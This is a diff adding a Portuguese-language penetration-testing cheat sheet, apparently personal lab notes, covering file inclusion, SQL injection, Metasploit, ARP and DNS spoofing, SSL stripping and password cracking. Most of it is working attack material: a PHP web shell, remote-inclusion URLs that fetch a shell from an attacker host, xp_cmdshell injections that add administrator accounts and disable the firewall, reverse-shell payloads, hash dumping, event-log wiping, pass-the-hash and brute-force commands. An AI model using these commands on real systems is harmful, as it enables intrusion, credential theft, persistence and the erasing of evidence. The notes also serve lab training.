@@ -1,0 +1,406 @@
+LFI RFI
+=======
+LFI
+===
+
+fimap -u 'http://192.168.159.129/lfi/escolhepagina.php?pagina=cadastro.php'
+http://192.168.159.129/lfi/escolhepagina.php?pagina=c:\boot.ini
+http://192.168.159.129/lfi/escolhepagina.php?pagina=c:\windows\win.ini
+
+
+RFI
+===
+
+Crie o arquivo up.txt em /var/www/html/ e levante o servico do apache2 
+
+<form enctype='multipart/form-data' action='' method='POST'>
+	<input type='hidden' name='MAX_FILE_SIZE' value='1000000' />
+	Enviar esse arquivo: <input name='userfile' type='file' />
+	<p>Para Remote File: <input name='remotefile' type='text'>
+	<input type='submit' value='Enviar arquivo' />
+</form>
+<?php 
+	$uploadfile = basename($_FILES['remotefile']['name']) . basename($_FILES['userfile']['name']);
+	echo '<pre>'; 
+	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) { 
+		echo 'Arquivo válido e enviado com sucesso.\n';
+	} else { 
+		echo 'Possível ataque de upload de arquivo!\n'; 
+	} 
+	echo 'Aqui está mais informações de debug:'; 
+	print_r($_FILES); 
+	print '</pre>'; 
+?>
+
+Tambem crie o arquivoi shell.txt
+
+<?php 
+	echo shell_exec($_GET['e']); exit;
+?>
+
+No browser
+
+http://192.168.159.129/rfi/rfi.php?page=http://192.168.159.130/shell.txt&&e=whoami
+http://192.168.159.129/rfi/rfi.php?page=http://192.168.159.130/up.txt
+
+SQLi
+====
+-- Habilitando o XP_CMDShell
+t'; exec sp_configure --
+t';exec sp_configure 'show advanced options',1 --
+t';reconfigure --
+t';exec sp_configure --
+t';exec sp_configure 'xp_cmdshell',1 --
+t';reconfigure --
+-- Visualizando os resultados
+t';exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\login_well\test.txt'; --
+t';exec xp_cmdshell 'whoami >> c:\inetpub\wwwroot\login_well\test.txt' --
+-- Criacao de usuario e inclusao dele em gropos de administracao
+t'; exec master.dbo.xp_cmdshell 'net user wsilva 123456 /add';--
+t'; exec master.dbo.xp_cmdshell 'net localgroup administrators wsilva /add';--
+t'; exec master.dbo.xp_cmdshell 'net localgroup "Remote Desktop Users" wsilva /add';--
+-- Desabilitando o Firewall
+t'; exec master.dbo.xp_cmdshell 'netsh firewall set opmode disable';--
+-- Habilitando o Terminal Service - TS
+t'; EXEC xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' --
+
+rdesktop -5 -a 16 -f 192.168.5.222
+
+sqlmap
+------
+# sqlmap -u "URL" command
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" --dbs --> lista os dbs
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -d --> mostra apenas o banner
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" --current-db --> vai informar qual o db atual da app
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart --tables --> Lista as tabelas
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users --columns --> lista as colunas
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users -C 'uname,pass' --dump --> lista os dados
+# sqlmap -u "http://testphp.vulnweb.com/categorias.php?cat=1" -D acuart -T users --dump-all --> lista todas as tabelas
+
+Bing SQLi
+=========
+
+Descobrir quantos registros existem
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(*) FROM users) > 1
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(*) FROM users) > 2
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(*) FROM users) > 3
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(*) FROM users) > 4
+
+# Descobrir os nomes dos campos da tabela
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(username) FROM users)
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(name) FROM users)
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT count(password) FROM users)
+
+# Descobrir o tamanho do campo => password = 5
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) = 9
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) = 8
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) = 7
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) = 6
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) = 5
+
+
+# Mapeando a senha do usuário
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),1,1)) = 49 => 1
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),2,1)) = 50 => 2
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),3,2)) = 51 => 3
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),4,2)) = 52 => 4
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),5,2)) = 53 => 5
+http://192.168.159.129/blind/index.php?id=4 AND ascii(substring((SELECT password FROM users WHERE id=5),6,2)) = 54 => 6
+password user id 5 = 123456
+
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) > 9
+
+
+http://192.168.159.129/blind/index.php?id=4 AND (SELECT length(password) FROM users WHERE id=4) > 9
+
+Metasploit
+==========
+nmap -sS -T5 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+nmap --scan-delay 15s -p -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 1 probe every 15 seconds
+nmap --max-rate 0.1 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 1 packet every 10 seconds
+nmap -f -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 8 bytes fragment packets
+nmap --mtu 16 -p 21,23,25,80,443,8080,1433,1521,3306 10.10.10.15
+		. 16 bytes fragment packets
+nmap -O -A 192.168.5.222
+# nmap -sS 192.168.1.10 192.168.1.20 -oA classscan
+# nmap -sS 192.168.1.20 -p 3232
+# nmap -sS 192.168.1.20 -oA classudp
+# nmap -sS 192.168.1.20 -oA classversion
+# nmap -sV -p 3232 192.168.1.20
+# nmap -sC 192.168.1.129 -oA script-output
+
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> show options
+msf> set RHOST 192.168.1.20
+msf> show targets
+msf> show payloads
+msf> set PAYLOAD windows/meterpreter/reverse_tcp
+msf> show options
+msf> set LPORT 443
+msf> exploit
+
+# msfvenom -h
+# msfvenom -p windows/meterpreter/reverse_tcp -o <-- -p payload e -o options
+# msfvenom --help-formats
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=443 -f exe > meterpreter.exe <-- -f formato e direciona para um arquivo a ser criado, deve ser enviado para a vitima e antes de ser executado deve  ser criado um handler
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=433 -f php > meterpreter.php <-- -f formato e direciona para um arquivo a ser criado, deve ser enviado para a vitima e antes de ser executado deve  ser criado um handler
+# python -m SimpleHTTPServer
+SQL Commands
+------------
+
+Exploiting Open phpMyAdmin
+
+http://192.168.1.20/phpmyadmin
+
+select "<?php system($_GET['cmd']); ?>" into outfile"C:\\xampp\\htdocs\shell.php"
+
+http://192.168.1.20/shell.php?cmd=ipconfig
+
+http://192.168.1.20/shell.php?cmd=net user
+http://192.168.1.20/shell.php?cmd=net user well password add/
+
+# atftpd --daemon --bind-address 192.168.1.10 /tmp
+
+http://192.168.1.20/shell.php?cmd=tftp 192.168.1.10 get meterpreter.php C:\\xampp\\htdocs\\meterpreter.php
+http://192.168.1.20/meterpreter.php
+
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.0.110
+msf exploit(handler) > set LPORT 443
+msf exploit(handler) > set ExitOnSession false
+msf exploit(handler) > exploit -j
+
+meterpreter> getuid
+meterpreter> hashdump
+meterpreter> help
+meterpreter> ps
+3020 explorer.exe
+meterpreter> migrete 3020
+meterpreter> background
+meterpreter> search -f *password*
+meterpreter> search -f *credit*
+meterpreter> hushdump
+meterpreter> shell
+meterpreter > clearev 
+[*] Wiping 389 records from Application...
+[*] Wiping 1296 records from System...
+[-] stdapi_sys_eventlog_open: Operation failed: 1314
+meterpreter > 
+
+Pass-the-Hash
+-------------
+meterpreter > run get_local_subnets
+Local subnet: 172.30.0.0/255.255.255.0
+Local subnet: 192.168.1.0/255.255.255.0
+meterpreter > background
+[*] Backgrounding session 5...
+msf exploit(ms08_067_netapi) > route add 172.30.0.0 255.255.0.0 5
+[*] Route added
+msf exploit(ms08_067_netapi) > route print
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.30.0.0         255.255.0.0        Session 5
+
+msf exploit(ms08_067_netapi) > 
+
+
+msf exploit(ms08_067_netapi) > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.1.126
+LHOST => 192.168.1.126
+msf exploit(psexec) > set RHOST 172.30.0.30
+RHOST => 172.30.0.30
+msf exploit(psexec) > set SMBPass 921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42
+SMBPass => 921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42
+msf exploit(psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf exploit(psexec) > set LPORT 8081
+LPORT => 8081
+msf exploit(psexec) > exploit
+
+[*] Started reverse handler on 192.168.1.126:8081 
+[*] Connecting to the server...
+[*] Authenticating to 172.30.0.30:445|WORKGROUP as user 'Administrator'...
+[*] Uploading payload...
+[*] Created \OgXcUxuA.exe...
+[*] Sending stage (885806 bytes) to 192.168.1.51
+[+] 172.30.0.30:445 - Service started successfully...
+[*] Deleting \OgXcUxuA.exe...
+[*] Meterpreter session 6 opened (192.168.1.126:8081 -> 192.168.1.51:1934) at 2015-11-27 17:24:20 -0200
+[-] Exploit failed: Rex::StreamClosedError Stream #<TCPSocket:0x007ffb382e4380> is closed.
+
+meterpreter > shell
+dsadd user CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br -pwd 12qw!@QW -pwdneverexpires yes -disabled no -memberof "CN=Administrators,CN=Builtin,DC=how2security,DC=com,DC=br" "CN=Schema Admins,CN=Users,DC=how2security,DC=com,DC=br" "CN=Enterprise Admins,CN=Users,DC=how2security,DC=com,DC=br"
+dsadd user CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br -pwd 12qw!@QW -pwdneverexpires yes -disabled no -memberof "CN=Administrators,CN=Builtin,DC=how2security,DC=com,DC=br" "CN=Schema Admins,CN=Users,DC=how2security,DC=com,DC=br" "CN=Enterprise Admins,CN=Users,DC=how2security,DC=com,DC=br"
+dsadd succeeded:CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br
+
+ARP Spoofing
+============
+
+Terminal 1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+wireshark
+
+Terminal 2
+root@kali-well:~# arpspoof -i eth0 -t 192.168.1.2 192.168.1.130
+
+Terminal 3
+root@kali-well:~# arpspoof -i eth0 -t 192.168.1.130 192.168.1.2
+
+Terminal 4
+echo "127.0.0.1 www.gmail.com" > hosts.txt
+vi hosts.txt 
+dnsspoof -i eth0 -f /root/hosts.txt 
+dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.1.126]
+192.168.1.130.1045 > 200.204.0.10.53:  28639+ A? www.gmail.com
+^C
+
+SSL Stripping - Man in the Middle
+---------------------------------
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+# arpspoof -i eth0 -t 192.168.1.20 192.168.1.1
+# arpspoof -t eth0 -t 192.168.1.1 192.168.1.20
+
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# sslstrip -l 8080
+
+Directory Transversion
+======================
+
+http://192.168.1.20/index.html?../../../../../boot.ini
+http://192.168.1.20/index.html?../../../../../WINDOWS/repair/sam
+http://192.168.1.20/index.html?../../../../../WINDOWS/repair/systems
+
+
+Password
+========
+
+Geração de WordList
+===================
+
+Softwares:
+	crunch
+	wyd
+
+Uso do Crunch:
+
+ no BT5 está em /pentest/password/crunch
+
+já existe uma wordlist de amostra dentro da pasta mostre o quanto ela é grande.
+
+O charlist.lst é os padrões de caracteres que o crunch pode trabalhar.
+
+	cat wl.txt
+	wc -l wl.txt
+
+	# crunch 5 8 12345678 > wordlist_num.txt
+	O primeiro parametro é a quantidade minima de caractere -> 5
+	o segundo parametro é a quantidade máxima de caractere -> 8
+	o terceiro e os caracteres que será usado para gerar as combinações -> 12345678
+	# cat wordlist_num.txt
+
+
+	# crunch 10 10 1234567890 -t junior@@@@ > juniorlist.txt
+	a diferença aqui é que em todas as linhas você pré-fixou a palavra junior e vai fazer as combinações possíveis nos utimos 4 caracteres. Além de tanto o mínimo como o máximo está fixado em 10.
+	# cat juniorlist.txt
+
+	Como dito anteriormente podemos entrar no arquivo charlist.lst e ver as combinações pré-definidas e usállas para gerar nossas wordlist.
+
+Agora vamos ver o wyd.pl
+
+	# tar xvzf wyd-2.0.tar.gz
+	# cd wyd-2.0
+	# rm wordlist wordlist_inteligent index.html
+	# 
+	# wget www.kernel.org
+	# ./wyd.pl -o worlist2.txt index.html
+	# cat wordlist2.txt
+	# cat wordlist2.txt | sort -u wordlist-inteligente.txt
+
+Online Password Cracking
+------------------------
+# hydra -l admin -P password.txt 192.168.1.20 ftp
+# hydra -l admin -P password.txt 192.168.1.20 rdp
+# hydra -l admin -P password.txt 192.168.1.20 mysql
+# hydra -l admin -P password.txt 192.168.1.20 http-post-form "/admin/index.php?usuario=^USER^&senha=^PASS^&submit=Login:Incorrect Username"
+
+
+-l --> username
+-L --> arquivo de usernames
+-p --> password
+-P --> Wordlist
+
+	-l -> usuario
+	-L -> lista de usuarios
+	-P -> lista de senhas
+	-p -> senha
+	-s -> porta do serviço
+	IP -> endereço ip
+	http-post-form -> "/admin/index.php?	usuario=^USER^&senha=^PASS^&submit=Login:Incorrect Username".
+
+por ultimo é o protocolo.
+
+Offline Password Cracking
+------------------------
+# vi windows7hashes.txt
+
+# john windows7hashes.txt
+
+# vi password.txt
+password
+Password
+PASSWORD
+p@ssw0rd
+P@ssw0rd
+P@SSW0RD
+
+# john --format=nt --wordlist=password.txt
+# john --show windows7hashes.txt
+# john linuxhashes.txt
+# john linuxhashes.txt --format=sha512crypt --wordlist=/usr/share/wordlist/rockyou.txt
+
+Using OclGashCat
+----------------
+
+# hashcat --help
+1000 = NTLM
+
+# cd /usr/share/hashcat/rules
+# cd /usr/share/wordlists
+# gunzip rockyou.txt.gz
+# vi windows7hashes.txt
+Administrator:500:çlakpoej3jpiajeoijoqwi3j:lsemf2ij4fowioejri4jofin4oifho:::
+                                               ^
+                                               +--- NTLM
+lsemf2ij4fowioejri4jofin4oifho
+
+:wq
+
+# hashcat -m 1000 windows7hashes.txt -o win7cracked.txt /usr/share/wordlists/rockyou.txt
+# vi win7cracked.txt
+
+
+# hashcat -m 1000 windows7hashes.txt -r /usr/share/hashcat/rules/base64.rule -o win7cracked.txt /usr/share/wordlists/rockyou.txt
+
+podemos também pegar um hash MD5 e colocar-lo na pesquisa do Google e derrepente alguem já tenha quebrado aquele hash.
+
+# pipal win7cracked.txt
+
+cd C:\PowerWell
+Set-ExecutionPolicy Unrestricted
+Import-Module .\PowerWell.psm1
+Invoke-BruteForce -ComputerName 192.168.159.129 -UserList C:\PowerWell\plus\users.txt -WordList C:\PowerWell\plus\wordlist-leak.txt -Service ActiveDirectory -StopOnSuccess -Verbose
+Invoke-BruteForce -ComputerName 192.168.159.129 -UserList C:\PowerWell\plus\user.txt -WordList C:\PowerWell\plus\wordlist-leak.txt -Service SQL -StopOnSuccess -Verbose
+Execute-MsDbShell -ComputerName win12 -UserName sa -Password P4ssw0rdS@
+
